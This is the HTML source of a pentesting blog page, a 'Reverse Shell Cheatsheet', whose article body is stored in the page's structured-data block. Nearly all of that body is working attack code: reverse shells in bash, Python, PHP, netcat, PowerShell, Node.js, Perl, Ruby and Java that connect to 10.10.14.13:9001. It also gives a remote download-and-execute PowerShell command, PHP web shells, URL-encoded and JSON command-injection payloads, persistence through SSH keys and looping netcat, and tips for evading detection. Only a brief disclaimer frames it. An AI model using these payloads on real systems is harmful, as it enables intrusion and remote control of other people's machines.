<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Reverse Shell Cheatsheet | realspaceeagle</title>
<meta name="keywords" content="reverse-shells, payload, post-exploitation, pentesting">
<meta name="description" content="Comprehensive collection of reverse shell commands, payloads, and techniques for various platforms and languages">
<meta name="author" content="realspaceeagle">
<link rel="canonical" href="https://realspaceeagle.github.io/cheatsheets/reverse-shells/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.a482bf00fa5c046040ef7973ad5fdf5657890cacb596c93f1382f664ca542074.css" integrity="sha256-pIK/APpcBGBA73lzrV/fVleJDKy1lsk/E4L2ZMpUIHQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://realspaceeagle.github.io/favicon.svg">
<link rel="icon" type="image/png" sizes="16x16" href="https://realspaceeagle.github.io/favicon.svg">
<link rel="icon" type="image/png" sizes="32x32" href="https://realspaceeagle.github.io/favicon.svg">
<link rel="apple-touch-icon" href="https://realspaceeagle.github.io/favicon.svg">
<link rel="mask-icon" href="https://realspaceeagle.github.io/favicon.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://realspaceeagle.github.io/cheatsheets/reverse-shells/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>

<meta name="description" content="Comprehensive collection of reverse shell commands, payloads, and techniques for various platforms and languages">
<meta name="keywords" content="reverse-shells, payload, post-exploitation, pentesting">
<meta name="author" content="realspaceeagle">
<meta name="robots" content="index, follow">
<meta name="viewport" content="width=device-width, initial-scale=1.0">


<link rel="canonical" href="https://realspaceeagle.github.io/cheatsheets/reverse-shells/">


<meta property="og:title" content="Reverse Shell Cheatsheet - realspaceeagle">
<meta property="og:description" content="Comprehensive collection of reverse shell commands, payloads, and techniques for various platforms and languages">
<meta property="og:url" content="https://realspaceeagle.github.io/cheatsheets/reverse-shells/">
<meta property="og:site_name" content="realspaceeagle">
<meta property="og:locale" content="en_US"><meta property="og:type" content="article">
<meta property="article:author" content="realspaceeagle"><meta property="article:published_time" content="2024-01-01T00:00:00Z"><meta property="article:modified_time" content="2024-01-01T00:00:00Z"><meta property="article:tag" content="reverse-shells"><meta property="article:tag" content="payload"><meta property="article:tag" content="post-exploitation"><meta property="article:tag" content="pentesting"><meta property="article:section" content="cheatsheets"><meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
  <meta property="og:image:alt" content="realspaceeagle">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@haran_loga">
<meta name="twitter:creator" content="@haran_loga">
<meta name="twitter:title" content="Reverse Shell Cheatsheet - realspaceeagle">
<meta name="twitter:description" content="Comprehensive collection of reverse shell commands, payloads, and techniques for various platforms and languages"><meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
  <meta name="twitter:image:alt" content="realspaceeagle"><meta name="article:author" content="realspaceeagle">
<meta name="article:publisher" content="https://realspaceeagle.github.io/"><meta name="news_keywords" content="reverse-shells, payload, post-exploitation, pentesting">
<script type="application/ld+json">
{
  "@context": "https://schema.org","@type": "BlogPosting",
  "headline": "Reverse Shell Cheatsheet",
  "description": "Comprehensive collection of reverse shell commands, payloads, and techniques for various platforms and languages",
  "author": {
    "@type": "Person",
    "name": "realspaceeagle",
    "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
    "description": "Cybersecurity enthusiast specializing in penetration testing, network security, and offensive security. Sharing knowledge through practical tutorials, tool reviews, and real-world scenarios. Passionate about helping others learn cybersecurity through hands-on experience.",
    "url": "https:\/\/realspaceeagle.github.io\/"
  },
  "publisher": {
    "@type": "Person",
    "name": "realspaceeagle",
    "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
    "url": "https:\/\/realspaceeagle.github.io\/"
  },
  "datePublished": "2024-01-01T00:00:00Z","dateModified": "2024-01-01T00:00:00Z","url": "https:\/\/realspaceeagle.github.io\/cheatsheets\/reverse-shells\/",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https:\/\/realspaceeagle.github.io\/cheatsheets\/reverse-shells\/"
  },"image": {
    "@type": "ImageObject",
    "url": "https:\/\/realspaceeagle.github.io\/images\/og-image.svg",
    "width": 1200,
    "height": 630
  },"keywords": "reverse-shells, payload, post-exploitation, pentesting",
  "articleSection": "cheatsheets",
  "wordCount":  1443 ,
  "genre": ["Cybersecurity", "Technology", "Education"],
  "about": [{
      "@type": "Thing",
      "name": "reverse-shells"
    },{
      "@type": "Thing",
      "name": "payload"
    },{
      "@type": "Thing",
      "name": "post-exploitation"
    },{
      "@type": "Thing",
      "name": "pentesting"
    }]}
</script>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position": 1,
      "name": "Home",
      "item": "https:\/\/realspaceeagle.github.io\/"
    },{
      "@type": "ListItem",
      "position":  2 ,
      "name": "Cheatsheets",
      "item": "https:\/\/realspaceeagle.github.io\/categories\/cheatsheets\/"
    },{
      "@type": "ListItem",
      "position":  3 ,
      "name": "Reverse Shell Cheatsheet",
      "item": "https:\/\/realspaceeagle.github.io\/cheatsheets\/reverse-shells\/"
    }]
}
</script>


<link rel="stylesheet" href="/css/terminal-style.css">


<link rel="stylesheet" href="/css/scroll-enhancement.css">


<link rel="stylesheet" href="/css/mobile-navigation.css">


<link rel="stylesheet" href="/css/mobile-responsive-pages.css">


<link rel="stylesheet" href="/css/header-width-fix.css">


<link rel="stylesheet" href="/css/share-buttons.css">


<link rel="stylesheet" href="/css/comments.css">


<link rel="stylesheet" href="/css/blog-enhancements.css">


<link rel="stylesheet" href="/css/blog-sidebar.css">


<link rel="stylesheet" href="/css/project-toggle.css">


<link rel="stylesheet" href="/css/code-copy-enhancements.css">


<link rel="stylesheet" href="/css/ctf-writeup.css">


<link rel="stylesheet" href="/css/github-stats.css">


<link rel="stylesheet" href="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar-responsive.css" onerror="this.remove();" />
<script src="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar.min.js" onerror="this.remove();"></script>


<script src="/js/github-calendar-enhanced.js" defer></script>


<script src="/js/github-contribution-tracker.js" defer></script>


<script src="/js/github-api-fallback.js" defer></script>


<script src="/js/github-integration.js" defer></script>


<script src="/js/twitter-timeline.js" defer></script>
<script src="/js/twitter-manual.js" defer></script>


<script src="/js/code-copy-enhanced.js" defer></script>





      <script async src="https://www.googletagmanager.com/gtag/js?id=G-GPTRZ14YZS"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-GPTRZ14YZS');
        }
      </script><meta property="og:url" content="https://realspaceeagle.github.io/cheatsheets/reverse-shells/">
  <meta property="og:site_name" content="realspaceeagle">
  <meta property="og:title" content="Reverse Shell Cheatsheet">
  <meta property="og:description" content="Comprehensive collection of reverse shell commands, payloads, and techniques for various platforms and languages">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="cheatsheets">
    <meta property="article:published_time" content="2024-01-01T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-01-01T00:00:00+00:00">
    <meta property="article:tag" content="Reverse-Shells">
    <meta property="article:tag" content="Payload">
    <meta property="article:tag" content="Post-Exploitation">
    <meta property="article:tag" content="Pentesting">
      <meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
<meta name="twitter:title" content="Reverse Shell Cheatsheet">
<meta name="twitter:description" content="Comprehensive collection of reverse shell commands, payloads, and techniques for various platforms and languages">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Security Cheatsheets",
      "item": "https://realspaceeagle.github.io/cheatsheets/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Reverse Shell Cheatsheet",
      "item": "https://realspaceeagle.github.io/cheatsheets/reverse-shells/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Reverse Shell Cheatsheet",
  "name": "Reverse Shell Cheatsheet",
  "description": "Comprehensive collection of reverse shell commands, payloads, and techniques for various platforms and languages",
  "keywords": [
    "reverse-shells", "payload", "post-exploitation", "pentesting"
  ],
  "articleBody": "Reverse Shell Cheatsheet Setup Listener Netcat Listener # Basic netcat listener nc -nlvp 9001 # Enhanced with rlwrap for better shell experience rlwrap nc -nlvp 9001 # OpenBSD netcat nc -nlvp 9001 # Traditional netcat nc -l -p 9001 Socat Listener # Basic socat listener socat file:`tty`,raw,echo=0 tcp-listen:9001 # Encrypted socat listener socat openssl-listen:9001,cert=server.crt,key=server.key,verify=0 - Bash Reverse Shells Basic Bash # Standard bash reverse shell bash -i \u003e\u0026 /dev/tcp/10.10.14.13/9001 0\u003e\u00261 # Alternative syntax bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.13/9001 0\u003e\u00261' # URL encoded for web applications bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F9001%200%3E%261%27 # Base64 encoded echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy85MDAxIDA+JjE= | base64 -d | bash Bash Variations # Using exec exec 5\u003c\u003e/dev/tcp/10.10.14.13/9001;cat \u003c\u00265 | while read line; do $line 2\u003e\u00265 \u003e\u00265; done # Using /bin/sh /bin/sh -i \u003e\u0026 /dev/tcp/10.10.14.13/9001 0\u003e\u00261 # With specific shell path /usr/bin/bash -i \u003e\u0026 /dev/tcp/10.10.14.13/9001 0\u003e\u00261 Python Reverse Shells Python 2 \u0026 3 Compatible # Standard Python reverse shell python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.13\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' # Python with pty spawn python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.13\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\");' # Python3 specific python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.13\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' Python PTY Shell # Interactive shell with PTY python -c 'import pty; pty.spawn(\"/bin/bash\")' python3 -c 'import pty; pty.spawn(\"/bin/bash\")' # Local Python PTY spawn (after getting basic shell) /usr/local/bin/python3 -c 'import pty; pty.spawn(\"/bin/sh\")' Advanced Python Shell # Multi-line Python reverse shell import socket, subprocess, os, threading, sys def s2p(s, p): while True: data = s.recv(1024) if len(data) \u003e 0: p.stdin.write(data) p.stdin.flush() def p2s(s, p): while True: s.send(p.stdout.read(1)) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((\"10.10.14.13\", 9001)) p = subprocess.Popen([\"/bin/sh\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE) s2p_thread = threading.Thread(target=s2p, args=[s, p]) p2s_thread = threading.Thread(target=p2s, args=[s, p]) s2p_thread.daemon = True p2s_thread.daemon = True s2p_thread.start() p2s_thread.start() try: p.wait() except KeyboardInterrupt: s.close() PHP Reverse Shells Basic PHP # Simple PHP reverse shell php -r '$sock=fsockopen(\"10.10.14.13\",9001);exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' # PHP with error handling php -r '$sock=fsockopen(\"10.10.14.13\",9001);if($sock){$proc=proc_open(\"/bin/sh -i\", array(0=\u003e$sock, 1=\u003e$sock, 2=\u003e$sock),$pipes);}' Web-based PHP Shell \u003c?php set_time_limit(0); $ip = '10.10.14.13'; $port = 9001; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } $daemon = 1; } else { printit(\"WARNING: Failed to daemonise. This is quite common and not fatal.\"); } chdir(\"/\"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } $descriptorspec = array( 0 =\u003e array(\"pipe\", \"r\"), 1 =\u003e array(\"pipe\", \"w\"), 2 =\u003e array(\"pipe\", \"w\") ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \"$string\\n\"; } } ?\u003e PHP Command Execution # Simple PHP command execution \u003c?php system($_GET['cmd']); ?\u003e # More advanced web shell \u003c?php if(isset($_GET['cmd'])) { echo \"\" . shell_exec($_GET['cmd']) . \"\"; } ?\u003e # POST request shell # POST /shell.php # cmd=bash -c 'bash -i /dev/tcp/10.10.14.13/9001 0\u003e\u00261' Netcat Reverse Shells Traditional Netcat # Basic netcat reverse shell nc -e /bin/sh 10.10.14.13 9001 # Alternative if -e is not available rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.14.13 9001 \u003e/tmp/f # Using ncat (Nmap's netcat) ncat 10.10.14.13 9001 -e /bin/bash # OpenBSD netcat nc 10.10.14.13 9001 -e /bin/sh Advanced Netcat # Netcat with PTY nc -e /bin/bash 10.10.14.13 9001 # Netcat persistent shell while true; do nc -e /bin/bash 10.10.14.13 9001; sleep 60; done # UDP reverse shell nc -u 10.10.14.13 9001 -e /bin/bash PowerShell Reverse Shells (Windows) Basic PowerShell # Simple PowerShell reverse shell powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u003e\u00261 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" # Base64 encoded PowerShell powershell -enc \u003cbase64_encoded_command\u003e # Download and execute powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/shell.ps1')\" Advanced PowerShell # PowerShell with authentication bypass powershell -ExecutionPolicy Bypass -File shell.ps1 # PowerShell one-liner (formatted) $client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.13\",9001); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2\u003e\u00261 | Out-String ); $sendback2 = $sendback + \"PS \" + (pwd).Path + \"\u003e \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close() Node.js Reverse Shells Basic Node.js # Simple Node.js reverse shell node -e \"require('child_process').exec('nc -e /bin/sh 10.10.14.13 9001')\" # Pure Node.js implementation (function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(9001, \"10.10.14.13\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })(); Other Language Shells Perl # Perl reverse shell perl -e 'use Socket;$i=\"10.10.14.13\";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");};' # Alternative Perl perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.10.14.13:9001\");STDIN-\u003efdopen($c,r);$~-\u003efdopen($c,w);system$_ while\u003c\u003e;' Ruby # Ruby reverse shell ruby -rsocket -e 'f=TCPSocket.open(\"10.10.14.13\",9001).to_i;exec sprintf(\"/bin/sh -i \u003c\u0026%d \u003e\u0026%d 2\u003e\u0026%d\",f,f,f)' # Alternative Ruby ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"10.10.14.13\",\"9001\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' Java # Java reverse shell import java.io.*; import java.net.*; public class ReverseShell { public static void main(String[] args) throws Exception { Socket s = new Socket(\"10.10.14.13\", 9001); Process p = Runtime.getRuntime().exec(\"/bin/bash\"); InputStream pi = p.getInputStream(); InputStream pe = p.getErrorStream(); InputStream si = s.getInputStream(); OutputStream po = p.getOutputStream(); OutputStream so = s.getOutputStream(); while(!s.isClosed()) { while(pi.available()\u003e0) so.write(pi.read()); while(pe.available()\u003e0) so.write(pe.read()); while(si.available()\u003e0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e) {} } p.destroy(); s.close(); } } Shell Stabilization TTY Upgrade # Python PTY python -c 'import pty; pty.spawn(\"/bin/bash\")' python3 -c 'import pty; pty.spawn(\"/bin/bash\")' # Background the shell CTRL + Z # Set raw mode and foreground stty raw -echo; fg # Set terminal environment export TERM=xterm # Check screen size and set stty -a stty rows 28 cols 110 Alternative TTY Methods # Using script script -qc /bin/bash /dev/null # Using socat (if available on target) socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.13:9001 # Using expect expect -c \"spawn /bin/bash; interact\" SSH-Based Access sshpass for Automated SSH Login # Install sshpass sudo apt install sshpass # SSH with password (from extracted credentials) sshpass -p 'PlayerOftheMatch2022' ssh player@10.10.11.194 # SSH with password from file echo 'password123' \u003e /tmp/pass sshpass -f /tmp/pass ssh user@target # SSH with password and command execution sshpass -p 'password' ssh user@target 'whoami' # Disable host key checking for testing sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@target SSH Key-Based Access # Use existing private key ssh -i /path/to/private_key user@target # SSH with specific key and no host checking ssh -i /path/to/key -o StrictHostKeyChecking=no user@target # Generate SSH key pair for persistence ssh-keygen -t rsa -f /tmp/key -N \"\" # Copy public key to target (if possible) cat /tmp/key.pub \u003e\u003e ~/.ssh/authorized_keys Shell Enhancement # Set environment variables export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin export SHELL=/bin/bash export HOME=/tmp # Enable command history export HISTFILE=/tmp/.bash_history # Color prompt export PS1='\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ ' Web Application Payloads Command Injection in Web Forms # Basic command injection ; bash -i \u003e\u0026 /dev/tcp/10.10.14.13/9001 0\u003e\u00261 # URL encoded %3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F9001%200%3E%261 # In JSON {\"cmd\": \"; bash -i \u003e\u0026 /dev/tcp/10.10.14.13/9001 0\u003e\u00261\"} # As POST parameter cmd=bash -c 'bash -i /dev/tcp/10.10.14.13/9001 0\u003e\u00261' File Upload Shells # Simple PHP upload shell \u003c?php system($_GET['cmd']); ?\u003e # Save as shell.php and upload, then access: # http://target.com/uploads/shell.php?cmd=nc -e /bin/bash 10.10.14.13 9001 Troubleshooting Common Issues # No netcat with -e flag rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.14.13 9001 \u003e/tmp/f # Firewall blocking outbound connections # Try different ports: 80, 443, 53, 25 nc 10.10.14.13 443 -e /bin/bash # Limited shell environment export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin # No interactive shell python -c 'import pty; pty.spawn(\"/bin/bash\")' Testing Connectivity # Test if target can reach your IP ping 10.10.14.13 # Test specific port telnet 10.10.14.13 9001 nc -nv 10.10.14.13 9001 # DNS exfiltration test nslookup test.yourdomain.com Security Considerations Operational Security Use encrypted channels when possible (HTTPS, SSH tunnels) Avoid leaving artifacts on target systems Clean up uploaded files and temporary files Use staging servers to avoid direct connections Detection Evasion Use common ports (80, 443, 53) to blend with normal traffic Implement delays between connection attempts Use domain names instead of IP addresses when possible Rotate source IP addresses if available Always ensure you have proper authorization before deploying reverse shells on any target system. These techniques should only be used for legitimate security testing purposes.\n",
  "wordCount" : "1443",
  "inLanguage": "en",
  "image": "https://realspaceeagle.github.io/images/og-image.svg","datePublished": "2024-01-01T00:00:00Z",
  "dateModified": "2024-01-01T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": {"avatar":"/images/avatar.svg","bio":"Cybersecurity enthusiast specializing in penetration testing, network security, and offensive security. Sharing knowledge through practical tutorials, tool reviews, and real-world scenarios. Passionate about helping others learn cybersecurity through hands-on experience.","name":"realspaceeagle","title":"Cybersecurity Professional \u0026 Penetration Tester"}
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://realspaceeagle.github.io/cheatsheets/reverse-shells/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "realspaceeagle",
    "logo": {
      "@type": "ImageObject",
      "url": "https://realspaceeagle.github.io/favicon.svg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }
</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://realspaceeagle.github.io/" accesskey="h" title="realspaceeagle (Alt + H)">realspaceeagle</a>
            
            
            <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle mobile menu">
                <span class="hamburger-line"></span>
                <span class="hamburger-line"></span>
                <span class="hamburger-line"></span>
            </button>
            
            <div class="logo-switches">
                
                <div class="social-icons">
                    <a href="https://www.linkedin.com/in/dream4ip/" target="_blank" rel="noopener noreferrer" 
                       title="Connect on LinkedIn" aria-label="LinkedIn Profile" class="social-link">
                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
                        </svg>
                    </a>
                    <a href="https://twitter.com/haran_loga" target="_blank" rel="noopener noreferrer" 
                       title="Follow on X/Twitter" aria-label="Twitter Profile" class="social-link">
                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
                        </svg>
                    </a>
                    <a href="https://github.com/realspaceeagle" target="_blank" rel="noopener noreferrer" 
                       title="View Code on GitHub" aria-label="GitHub Profile" class="social-link">
                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
                        </svg>
                    </a>
                </div>
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        
        <ul id="menu" class="desktop-menu">
            <li>
                <a href="https://realspaceeagle.github.io/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
                    <span>Cheatsheets</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/projects/" title="Projects">
                    <span>Projects</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/contact/" title="Contact">
                    <span>Contact</span>
                </a>
            </li>
        </ul>
        
        
        <div id="mobile-menu" class="mobile-menu">
            <ul class="mobile-menu-list">
                <li>
                    <a href="https://realspaceeagle.github.io/" title="Home">
